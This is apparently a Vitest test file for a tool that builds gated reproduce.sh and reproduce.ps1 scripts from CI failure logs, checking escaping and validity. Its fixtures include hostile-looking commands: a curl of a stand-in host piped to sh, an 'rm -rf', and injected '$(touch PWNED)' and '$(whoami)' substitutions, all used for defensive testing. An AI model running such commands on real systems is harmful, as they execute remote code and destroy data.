import { describe, it, expect, afterAll } from "vitest";
import { execFileSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  buildReproduceSh,
  buildReproducePs1,
  shDq,
  psDq,
} from "../../src/core/bundle.js";
import { extractFailure, findReproCommand } from "../../src/core/extract.js";
import { fingerprintFailure } from "../../src/core/fingerprint.js";
import type { BundleInput } from "../../src/core/bundle.js";

function inputFor(reproCommand: string, summary = "Failure: boom"): BundleInput {
  return {
    sourceDisplay: "fixtures/logs/x.log",
    ecosystem: {
      id: "npm",
      confidence: "high",
      evidence: ["t"],
      installCommand: "npm ci",
      testCommand: "npm test",
      runHint: "h",
    },
    runtime: {},
    failure: {
      summary,
      errorLines: ["boom"],
      reproCommand,
      hint: "h",
      matched: true,
      anchor: "boom",
    },
    redactedLogs: "boom",
    redactions: 0,
    fingerprint: fingerprintFailure({
      ecosystem: "npm",
      reproCommand,
      errorLines: ["boom"],
    }),
  };
}

const DANGEROUS = [
  "npm test && curl http://evil.example/x | sh",
  "make test; rm -rf /tmp/victim",
  "pytest > /tmp/out.txt 2>&1",
  "make test FOO=$(bar) `baz`",
  "node -e \"console.log('a;b')\"",
  "FOO=1 BAR='a b' ./run.sh --x=$Y",
];

describe("repro command embedding", () => {
  it.each(DANGEROUS)("embeds %s verbatim as the executed line", (cmd) => {
    const sh = buildReproduceSh(inputFor(cmd));
    expect(sh).toContain(`\n${cmd}\n`);
  });

  it("shows an escaped (not executable) copy in the display line", () => {
    const sh = buildReproduceSh(inputFor("make test FOO=$(bar)"));
    expect(sh).toContain("==> [actionrepro] running: make test FOO=\\$(bar)");
  });

  it("deliberately skips bare `Run echo ...` lines (not real commands)", () => {
    expect(findReproCommand(["Run echo hello", "##[error]x"], 1)).toBeUndefined();
  });

  it("keeps the confirmation gate and phase verdicts", () => {
    const sh = buildReproduceSh(inputFor("npm test"));
    expect(sh).toContain("CI_REPRO_YES");
    expect(sh).toContain("[y/N]");
    expect(sh).toContain("exit 4");
    expect(sh).toContain("INSTALL_FAILED");
    expect(sh).toContain("exit 3");
    expect(sh).toContain("REPRODUCED");
    expect(sh).toContain("NOT REPRODUCED");
    expect(sh).toContain("SECURITY NOTICE");
  });

  it("never executes metadata: summary substitutions stay escaped", () => {
    const sh = buildReproduceSh(inputFor("npm test", 'bad $(touch PWNED) `id` "q" \\'));
    // No UNESCAPED substitution survives (lookbehind: not preceded by backslash).
    expect(sh).not.toMatch(/(?<!\\)\$\(touch PWNED\)/);
    expect(sh).not.toMatch(/(?<!\\)`id`/);
    expect(sh).toContain("\\$(touch PWNED)");
    expect(sh).toContain('\\"q\\"');
    expect(sh).toContain("\\\\");
  });

  it("neutralizes workflow-command markers in script output lines", () => {
    const sh = buildReproduceSh(
      inputFor("npm test", "Failure: ##[error]Process completed with exit code 1."),
    );
    expect(sh).not.toContain("##[error]");
    expect(sh).toContain("## [error]");
    // The executed command line itself stays verbatim.
    expect(sh).toContain("\nnpm test\n");
  });
});

describe("PowerShell script", () => {
  it("embeds the command literally with a gate (no Invoke-Expression)", () => {
    const cmd = "npm test && echo hi; ./x.ps1";
    const ps1 = buildReproducePs1(inputFor(cmd));
    expect(ps1).toContain(`\n${cmd}\n`);
    // No eval-style invocation of the command (match the call form, not the
    // explanatory comment above the command).
    expect(ps1).not.toMatch(/Invoke-Expression\s*"/);
    expect(ps1).toContain("CI_REPRO_YES");
    expect(ps1).toContain("IsInputRedirected");
    expect(ps1).toContain("exit 4");
    expect(ps1).toContain("INSTALL_FAILED");
    expect(ps1).toContain("exit 3");
    expect(ps1).toContain("REPRODUCED");
    expect(ps1).toContain("NOT REPRODUCED");
  });

  it("escapes metadata for PowerShell double-quoted strings", () => {
    const ps1 = buildReproducePs1(inputFor("npm test", "bad $HOME `x`"));
    expect(ps1).toContain("`$HOME");
    expect(ps1).toContain("``x``");
  });

  it("neutralizes workflow-command markers in ps1 output lines", () => {
    const ps1 = buildReproducePs1(inputFor("npm test", "Failure: ##[error]x"));
    expect(ps1).not.toContain("##[error]");
    expect(ps1).toContain("## [error]");
  });
});

describe("shDq / psDq", () => {
  it("escapes bash double-quote metacharacters", () => {
    expect(shDq('a"b\\c$d`e')).toBe('a\\"b\\\\c\\$d\\`e');
  });
  it("escapes PowerShell double-quote metacharacters", () => {
    expect(psDq('a"b$c`d')).toBe('a`"b`$c``d');
  });
  it("leaves plain text untouched", () => {
    expect(shDq("npm test")).toBe("npm test");
    expect(psDq("npm test")).toBe("npm test");
  });
});

describe("extraction preserves dangerous commands exactly", () => {
  it.each(DANGEROUS)("findReproCommand keeps %s intact", (cmd) => {
    const anchor = "##[error]Process completed with exit code 1.";
    expect(findReproCommand([`Run ${cmd}`, anchor], 1)).toBe(cmd);
  });

  it("extractFailure carries the verbatim command through", () => {
    const cmd = "npm test; echo $(whoami) > out.txt";
    const f = extractFailure([
      `Run ${cmd}`,
      "##[error]Process completed with exit code 1.",
    ]);
    expect(f.reproCommand).toBe(cmd);
  });
});

/**
 * Generated scripts must at least be valid bash. A syntax error here used to
 * ship silently (the pip bundle failed `bash -n` at line 44 in CI's smoke).
 */
describe("generated reproduce.sh is valid bash (bash -n)", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "actionrepro-syntax-"));
  afterAll(() => fs.rmSync(dir, { recursive: true, force: true }));

  function syntaxOk(script: string, name: string): void {
    const file = path.join(dir, name);
    fs.writeFileSync(file, script);
    execFileSync("bash", ["-n", file], { stdio: "pipe" });
  }

  it.each(DANGEROUS)("parses when the repro command is %s", (cmd) => {
    syntaxOk(
      buildReproduceSh(inputFor(cmd)),
      `d-${Buffer.from(cmd).toString("hex").slice(0, 12)}.sh`,
    );
  });

  it.each([
    "npm",
    "pnpm",
    "yarn",
    "pip",
    "uv",
    "cargo",
    "go",
    "maven",
    "gradle",
    "dotnet",
    "ruby",
    "unknown",
  ])("parses for the %s ecosystem install block", (id) => {
    const input = inputFor("make test");
    input.ecosystem = { ...input.ecosystem, id: id as BundleInput["ecosystem"]["id"] };
    syntaxOk(buildReproduceSh(input), `eco-${id}.sh`);
  });

  it("parses for an install-less bundle with no runnable command (exit 5 path)", () => {
    const sh = buildReproduceSh(noCommandInput());
    expect(sh).toMatch(/NO REPRO COMMAND/);
    syntaxOk(sh, "no-cmd.sh");
  });
});

function noCommandInput(): BundleInput {
  const input = inputFor("");
  input.ecosystem = {
    ...input.ecosystem,
    id: "unknown",
    testCommand: "# see failure.txt for the failing command",
  };
  return input;
}

describe("generated reproduce.ps1 carries the same exit-code contract", () => {
  it("emits exit 3 for a failed dependency setup and exit 4 at the prompt", () => {
    const ps1 = buildReproducePs1(inputFor("npm test"));
    expect(ps1).toMatch(/INSTALL_FAILED/);
    expect(ps1).toMatch(/exit 3/);
    expect(ps1).toMatch(/exit 4/);
  });

  it("uses a NO REPRO COMMAND message when there is nothing to run", () => {
    expect(buildReproducePs1(noCommandInput())).toMatch(/NO REPRO COMMAND/);
    expect(buildReproducePs1(noCommandInput())).toMatch(/exit 5/);
  });
});
